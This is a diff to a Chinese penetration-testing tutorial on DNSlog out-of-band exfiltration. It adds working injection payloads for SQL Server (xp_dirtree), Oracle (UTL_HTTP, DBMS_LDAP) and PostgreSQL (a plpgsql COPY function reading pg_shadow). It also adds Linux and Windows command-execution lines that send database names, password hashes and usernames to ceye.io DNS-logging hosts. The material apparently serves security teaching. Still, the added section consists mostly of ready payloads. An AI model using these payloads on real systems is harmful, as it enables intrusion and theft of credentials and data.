@@ -1,8 +1,8 @@
 <!-- TOC -->
 
 - [前言](#前言)
-- [DNSlog技术说明](#dnslog技术说明)
-- [利用该技术的场景](#利用该技术的场景)
+- [技术说明](#技术说明)
+- [利用场景](#利用场景)
 - [技术原理](#技术原理)
 - [利用细节](#利用细节)
     - [SQL注入](#sql注入)
@@ -20,11 +20,11 @@
 ## 前言
 &emsp;我们在测试盲注的时候，发现速度非常慢，那这个时候，爱思考的人就想到了利用DNS来突破这个限制，准确来说是利用DNS的log功能。
 
-## DNSlog技术说明
+## 技术说明
 &emsp;DNSlog注入属于带外通信的一种，英文：Out of Band，简称：OOB。我们之前的注入都是在同一个信道上面的，比如我们之前的联合查询注入，都是做HTTP请求，然后得到HTTP返回包，没有涉及到其他的信道，比如DNS。而带外通信，至少是要涉及到两个信道的。信道：在计算机中，指通信的通道，是信号传输的媒介。
 
 
-## 利用该技术的场景
+## 利用场景
 &emsp;每项技术都有其利用场景，并非万能的，而DNS log注入技术也是，我们在进行SQL盲注、命令执行、SSRF及XSS等攻击而无法看到回显结果时，就会用到该技术。
 
 ## 技术原理
@@ -57,12 +57,83 @@ dvwa实战语句：`'and SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM us
 **因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据**
 
 #### SQL Server
+主体语句：`DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.8dmer4.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');`
+
+实战语句：`';DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.8dmer4.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"')--`
 
 #### Oracle
+```
+SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');
+SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;
+SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;
+SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;
+SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL;
+```
+
 
 #### PostgreSQL
+```
+DROP TABLE IF EXISTS table_output;
+CREATE TABLE table_output(content text);
+CREATE OR REPLACE FUNCTION temp_function()
+RETURNS VOID AS $
+DECLARE exec_cmd TEXT;
+DECLARE query_result TEXT;
+BEGIN
+SELECT INTO query_result (SELECT passwd
+FROM pg_shadow WHERE usename='postgres');
+exec_cmd := E'COPY table_output(content)
+FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';
+EXECUTE exec_cmd;
+END;
+$ LANGUAGE plpgsql SECURITY DEFINER;
+SELECT temp_function();
+```
 
 ### 命令执行
+* Linux
+```
+curl http://ip.port.b182oj.ceye.io/`whoami`
+ping -c 1 `whoami`.ip.port.b182oj.ceye.io
+```
+
+* Windows
+```
+ping %USERNAME%.b182oj.ceye.io
+
+变量                     类型       描述
+%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
+%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
+%CD%                     本地       返回当前目录字符串。
+%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
+%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
+%COMPUTERNAME%           系统       返回计算机的名称。
+%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
+%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
+%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
+%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
+%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
+%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
+%PATH%                   系统       指定可执行文件的搜索路径。
+%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
+%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
+%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
+%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
+%PROCESSOR_REVISION%     系统       返回处理器的版本号。
+%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
+%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
+%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
+%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
+%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
+%TIME%                   系统       返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。
+%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
+%USERNAME%               本地       返回当前登录的用户的名称。
+%USERPROFILE%            本地       返回当前用户的配置文件的位置。
+%WINDIR%                 系统       返回操作系统目录的位置。
+```
 
 ### SSRF
 
